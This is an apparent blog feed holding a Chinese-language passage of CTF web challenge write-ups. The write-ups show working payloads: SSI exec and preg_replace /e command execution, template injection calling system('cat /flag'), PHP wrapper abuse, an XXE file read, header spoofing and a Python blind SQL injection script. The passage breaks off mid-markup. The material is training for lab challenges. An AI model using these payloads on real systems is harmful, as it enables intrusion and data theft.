<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>d0ud</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-07T01:23:53.518Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>d0ud</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些CTF题解</title>
    <link href="http://example.com/%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/%E9%A2%98%E8%A7%A3/</id>
    <published>2023-09-07T01:23:53.518Z</published>
    <updated>2023-09-07T01:23:53.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lt-BJDCTF2020-gt-EasySearch-1"><a href="#lt-BJDCTF2020-gt-EasySearch-1" class="headerlink" title="&lt;BJDCTF2020&gt;EasySearch 1"></a>&lt;BJDCTF2020&gt;EasySearch 1</h1><p>扫描目录得到<code>index.php.swp</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'            ***            ***            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">**</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">**</span><span class="token operator">*</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数<code>password</code>用于验证，用脚本可得到<code>password</code>应为<code>2020666</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> count<span class="token keyword">for</span> i <span class="token keyword">in</span> count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    passw <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    md<span class="token punctuation">.</span>update<span class="token punctuation">(</span>passw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hashid <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hashid<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>passw<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>username</code>用于写入文件<br>注意文件后缀为<code>shtml</code>，<code>shtml</code>文件是可以写入SSI指令的<br>成功写入后在响应头里可以得到文件路径</p><p>在网站根目录下找到文件<code>flag_990c66bf85a09c664f0b6741840499b2</code><br>最终payload为</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">username=<span class="token comment">&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></span>&amp;password=2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="lt-BJDCTF2020-gt-ZJCTF，不过如此"><a href="#lt-BJDCTF2020-gt-ZJCTF，不过如此" class="headerlink" title="&lt;BJDCTF2020&gt;ZJCTF，不过如此"></a>&lt;BJDCTF2020&gt;ZJCTF，不过如此</h1><p>打开题目，为源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然需要利用伪协议</p><p><code>/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p>对回显内容解码，得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>preg_replace/e</code>模式可执行代码的特性，传参为<code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code>，得到flag</p><p>具体可参考<code>paidx0</code>师傅的博客 <a href="https://blog.csdn.net/weixin_49656607/article/details/119833707">https://blog.csdn.net/weixin_49656607/article/details/119833707</a></p><h1 id="lt-CISCN2019-华东南赛区-gt-Web11"><a href="#lt-CISCN2019-华东南赛区-gt-Web11" class="headerlink" title="&lt;CISCN2019 华东南赛区&gt;Web11"></a>&lt;CISCN2019 华东南赛区&gt;Web11</h1><p>打开题目，一个不明所以的界面，重点在<code>get ip</code>和<code>xff</code>，显然，试试改动<code>xff</code>头，果然回显的当前ip地址为<code>xxf</code>头的值，那么，模板注入？</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<code>flag</code></p><h1 id="lt-GWCTF-2019-gt-枯燥的抽奖"><a href="#lt-GWCTF-2019-gt-枯燥的抽奖" class="headerlink" title="&lt;GWCTF 2019&gt;枯燥的抽奖"></a>&lt;GWCTF 2019&gt;枯燥的抽奖</h1><p>打开题目，从源码里发现<code>check.php</code><br>访问得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ljiUB7yF7i<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用了伪随机函数<code>mt_srand()</code>，虽然种子在服务端产生，但是是固定不变的，爆破种子推出<code>$str</code>即可</p><h1 id="lt-HFCTF2020-gt-EasyLogin"><a href="#lt-HFCTF2020-gt-EasyLogin" class="headerlink" title="&lt;HFCTF2020&gt;EasyLogin"></a>&lt;HFCTF2020&gt;EasyLogin</h1><p>打开题目，一个登录框，带有注册功能，尝试注册并登录后提示有<code>flag</code>，但无查看权限</p><p>那么显然我们需要以<code>admin</code>的身份登录，第一个方法是爆破密码，尝试了部分常见密码，无果。那么第二个方法，伪造登录凭证，<br>注册并登录，查看数据包，可以发现</p><p><img src="https://null-d0ud.github.io/img/HFCTF2020EasyLogin2.png"></p><p>很显然，<code>jwt</code>解密，得到</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;header&quot;:&#123;    &quot;alg&quot;:&quot;HS256&quot;    &quot;typ&quot;:&quot;JWT&quot;    &#125;    &quot;payload&quot;:&#123;    &quot;secretid&quot;:0    &quot;username&quot;:&quot;A&quot;    &quot;password&quot;:&quot;A&quot;    &quot;iat&quot;:1649828192    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造<code>jwt</code>即可</p><h1 id="lt-MRCTF2020-gt-PYWebsite"><a href="#lt-MRCTF2020-gt-PYWebsite" class="headerlink" title="&lt;MRCTF2020&gt;PYWebsite"></a>&lt;MRCTF2020&gt;PYWebsite</h1><p>打开题目，需要授权码获取<code>flag</code>,查看源码发现存在<code>flag.php</code>，直接访问，得到</p><blockquote><p>我已经把购买者的IP保存了，显然你没有购买</p><p>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag</p></blockquote><p>修改请求头，添加<code>x-Forwarded-For:127.0.0.1</code>,得到<code>flag</code></p><h1 id="lt-NCTF2019-gt-Fake-XML-cookbook"><a href="#lt-NCTF2019-gt-Fake-XML-cookbook" class="headerlink" title="&lt;NCTF2019&gt;Fake XML cookbook"></a>&lt;NCTF2019&gt;Fake XML cookbook</h1><p>首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现<code>flag</code>就在根目录下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY b SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-NCTF2019-gt-SQLi"><a href="#lt-NCTF2019-gt-SQLi" class="headerlink" title="&lt;NCTF2019&gt;SQLi"></a>&lt;NCTF2019&gt;SQLi</h1><p>打开题目</p><blockquote><p>sqlquery : select * from users where username=’’ and passwd=’’</p></blockquote><p>存在<code>robots.txt</code>，得到提示</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i"</span><span class="token punctuation">;</span><span class="token keyword">If</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> admin's password<span class="token punctuation">,</span>Then you will get the flag<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了单引号，但没有过滤转义符号，还是可以逃逸的，php是可以<code>%00</code>截断的版本</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">username=\&amp;passwd=||(1);%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><blockquote><p><strong>HTTP/1.1 302 Found</strong><br>Server: openresty<br>Date: Wed, 01 Dec 2021 09:17:49 GMT<br>Content-Type: text/html<br>Content-Length: 2228<br>Connection: close<br><strong>Location: welcome.php</strong><br>X-Powered-By: PHP/5.2.16</p></blockquote><p>根据提示需要获取admin的密码，显然是布尔盲注了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurll<span class="token operator">=</span><span class="token string">"http://6cd4da7b-0239-4646-a44a-8ef97233503e.node4.buuoj.cn:81"</span>dataa<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>passwd<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token string">"qwertyuioplkjhgfdsazxcvbnmAQZXSWEDCVFRTGBNHYUJMKIOLP1234567890_"</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"||(passwd/**/regexp/**/\"^</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">&#125;</span></span><span class="token string">\");"</span></span><span class="token operator">+</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">"%00"</span><span class="token punctuation">)</span>        dataa<span class="token punctuation">[</span><span class="token string">"passwd"</span><span class="token punctuation">]</span><span class="token operator">=</span>payload        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>urll<span class="token punctuation">,</span>data<span class="token operator">=</span>dataa<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>            passwd<span class="token operator">+=</span>w            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交密码，得到flag</p><h1 id="lt-NPUCTF2020-gt-ezinclude"><a href="#lt-NPUCTF2020-gt-ezinclude" class="headerlink" title="&lt;NPUCTF2020&gt;ezinclude"></a>&lt;NPUCTF2020&gt;ezinclude</h1><p>打开题目</p><blockquote><p>username/password error</p></blockquote><p>扫描目录</p><blockquote><p>config.php<br>dir.php<br>index.php<br>index.php/login</p></blockquote><p>在网页源码中得到提示</p><blockquote><p>&lt;!–md5($secret.$name)===$pass –&gt;</p></blockquote><p>发现在请求头的<code>Cookie</code>中有一个<code>Hash</code>值，一般来说，那多半就是<code>md5(\$secret.\$name)</code>的值，也就是<code>pass</code>要等于这个<code>Hash</code>值，直接借着<code>Cookie</code>里的<code>Hash</code>值，传参，跳转到一个404界面</p><p>还是请求头，有一个</p><blockquote><p>Referer: <a href="http://cec81b70-7911-472d-bff7-8dd27ac459ad.node4.buuoj.cn:81/flflflflag.php">http://cec81b70-7911-472d-bff7-8dd27ac459ad.node4.buuoj.cn:81/flflflflag.php</a></p></blockquote><p>尝试访问，得到</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token 